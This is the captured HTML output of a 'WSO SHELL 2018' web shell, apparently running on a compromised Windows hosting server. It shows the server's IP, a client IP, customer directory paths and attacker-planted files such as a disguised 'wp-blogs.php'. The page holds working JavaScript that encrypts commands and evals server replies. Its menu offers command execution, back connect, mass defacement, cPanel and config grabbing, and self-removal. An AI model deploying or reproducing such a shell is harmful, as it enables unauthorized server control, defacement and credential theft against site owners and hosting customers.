 <html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title> WSO SHELL 2018</title>
<style>
	body {background-color:#0d0d0d; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
	#particles-js{width: 100%; height: 100px; background-color: #0d0d0d; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
	table.info	{color:#ffffff;}
	table#toolsTbl {background-color: #0d0d0d;}
	span,h1,a	{color:#ff9900 !important;}
	span		{font-weight:bolder;}
	h1			{border-left:5px solid #ff5e00d9;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
	div.content	{padding:5px;margin-left:5px;background-color:#0d0d0d;}
	a			{text-decoration:none;}
	a:hover		{text-decoration:underline;}
	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
	.tooltip:hover::after {opacity:1;visibility:visible;}
	.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
	.bigarea	{min-width:100%;max-width:100%;height:400px;}
	input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
	label {position:relative}
	label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
	form		{margin:0px;}
	#toolsTbl	{text-align:center;}
	#fak 		{background:none;}
	#fak td 	{padding:5px 0 0 0;}
	iframe		{border:1px solid #0d0d0d;}
	.toolsInp	{width:300px}
	.main th	{text-align:left;background-color:#0d0d0d;}
	.main tr:hover{background-color:#373c42;}
	.main td, th{vertical-align:middle;}
	input[type='submit']{background-color:#ff5e00d9;}
	input[type='button']{background-color:#ff5e00d9;}
	input[type='submit']:hover{background-color:#ff5e00d9;}
	input[type='button']:hover{background-color:#ff5e00d9;}
	.l1			{background-color:#202832;}
	pre			{font:9pt Courier New;}
</style>
<script>
    var c_ = 'C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/Resources/Dashboard/';
    var a_ = 'FilesMan'
    var charset_ = 'UTF-8';
    var p1_ = '';
    var p2_ = '';
    var p3_ = '';
    var d = document;
	function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
	function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
	function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		d.mf.a.value = encrypt(d.mf.a.value,'44a5e524f134e3228c7b0b16c2224ffc');
		d.mf.c.value = encrypt(d.mf.c.value,'44a5e524f134e3228c7b0b16c2224ffc');
		d.mf.p1.value = encrypt(d.mf.p1.value,'44a5e524f134e3228c7b0b16c2224ffc');
		d.mf.p2.value = encrypt(d.mf.p2.value,'44a5e524f134e3228c7b0b16c2224ffc');
		d.mf.p3.value = encrypt(d.mf.p3.value,'44a5e524f134e3228c7b0b16c2224ffc');
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('/Resources/Dashboard/wp-blogs.php', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:<br>Drives:</span></td><td><nobr>Windows NT PEMWINWEB28 6.0 build 6003 (Windows Server 2008 Web Server Edition Service Pack 2) i586 <a href="https://anon.click/protected/https://www.google.com/search?q=Windows+NT+PEMWINWEB28+6.0+build+6003+%28Windows+Server+2008+Web+Server+Edition+Service+Pack+2%29+i586" target="_blank">[ Google ]</a> <a href="https://www.exploit-db.com/search/?action=search&description=Windows+NT+6.0" target=_blank>[ Exploit-DB ]</a></nobr><br>0 ( i00154290 ) <span>Group:</span> 0 ( ? )<br>5.3.28 <span>Safe mode:</span> <font color=#e6b000><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2020-10-08 21:46:27<br>10.00 GB <span>Free:</span> 10.00 GB (100%)<br><a href='#' onclick='g("FilesMan","C:/")'>C:/</a><a href='#' onclick='g("FilesMan","C:/CustomerData/")'>CustomerData/</a><a href='#' onclick='g("FilesMan","C:/CustomerData/webspaces/")'>webspaces/</a><a href='#' onclick='g("FilesMan","C:/CustomerData/webspaces/webspace_00154290/")'>webspace_00154290/</a><a href='#' onclick='g("FilesMan","C:/CustomerData/webspaces/webspace_00154290/webapps/")'>webapps/</a><a href='#' onclick='g("FilesMan","C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/")'>SiteApp31028/</a><a href='#' onclick='g("FilesMan","C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/")'>htdocs/</a><a href='#' onclick='g("FilesMan","C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/Resources/")'>Resources/</a><a href='#' onclick='g("FilesMan","C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/Resources/Dashboard/")'>Dashboard/</a> <font color=white><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/Resources/Dashboard','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>81.17.250.66<br><span>Client IP:</span><br>103.129.32.65</nobr></td></tr></table><table style="background-color:#373c42;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Mass Deface</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Adminer</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Terminal</a> ]</th><th>[ <a href="#" onclick="g('Massuser',null,'','','')">Mass Title Edit</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Grab Cpanel</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Get Configs</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">Jumping</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Cgi Telnet</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Back Connect</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><br><h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script><script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/Resources/Dashboard/..');" ><b>[ .. ]</b></a></td><td>dir</td><td>2011-09-27 11:42:38</td><td>0/0</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=white><b>drwxrwxrwx</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="a" class=chkbx></td><td><a href=# onclick="g('FilesMan','C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/Resources/Dashboard/a');" ><b>[ a ]</b></a></td><td>dir</td><td>2020-10-08 20:14:04</td><td>0/0</td><td><a href=# onclick="g('FilesTools',null,'a','chmod')"><font color=#e6b000><b>drwxrwxrwx</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'a', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'a', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="ccs.aspx" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'ccs.aspx', 'view')">ccs.aspx</a></td><td>894 B</td><td>2020-10-08 19:41:32</td><td>0/0</td><td><a href=# onclick="g('FilesTools',null,'ccs.aspx','chmod')"><font color=white><b>-rw-rw-rw-</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'ccs.aspx', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'ccs.aspx', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'ccs.aspx', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'ccs.aspx', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'ccs.aspx', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="jquery.dashboard.js" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'jquery.dashboard.js', 'view')">jquery.dashboard.js</a></td><td>3.69 KB</td><td>2011-09-27 11:42:38</td><td>0/0</td><td><a href=# onclick="g('FilesTools',null,'jquery.dashboard.js','chmod')"><font color=white><b>-rw-rw-rw-</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'jquery.dashboard.js', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'jquery.dashboard.js', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'jquery.dashboard.js', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'jquery.dashboard.js', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'jquery.dashboard.js', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="m.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'m.php', 'view')">m.php</a></td><td>96.20 KB</td><td>2020-10-08 19:46:05</td><td>0/0</td><td><a href=# onclick="g('FilesTools',null,'m.php','chmod')"><font color=white><b>-rw-rw-rw-</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'m.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'m.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'m.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'m.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'m.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wp-blogs.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wp-blogs.php', 'view')">wp-blogs.php</a></td><td>93.45 KB</td><td>2020-10-08 19:47:00</td><td>0/0</td><td><a href=# onclick="g('FilesTools',null,'wp-blogs.php','chmod')"><font color=white><b>-rw-rw-rw-</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wp-blogs.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wp-blogs.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wp-blogs.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wp-blogs.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wp-blogs.php', 'download')">D</a></td></tr><tr id=fak><td colspan=7>
	<input type=hidden name=ne value=''>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/Resources/Dashboard/'>
	<input type=hidden name=charset value='UTF-8'>
	<label><select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><option value='zip'>+ zip</option><option value='unzip'>- zip</option><option value='tar'>+ tar.gz</option></select></label><input type='submit' value='submit'></td></tr></form></table></div>
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	<tr>
		<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/Resources/Dashboard/'><input type=submit value='submit'></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color=red>(Not writable)</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color=red>(Not writable)</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='C:/CustomerData/webspaces/webspace_00154290/webapps/SiteApp31028/htdocs/Resources/Dashboard/'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=ne value=''>
		<input type=hidden name=charset value='UTF-8'>
		<span>Upload file:</span> <font color=red>(Not writable)</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
	</tr></table></div>
	<!-- particles --> <div id='particles-js'></div><script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
	<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
	</body></html>
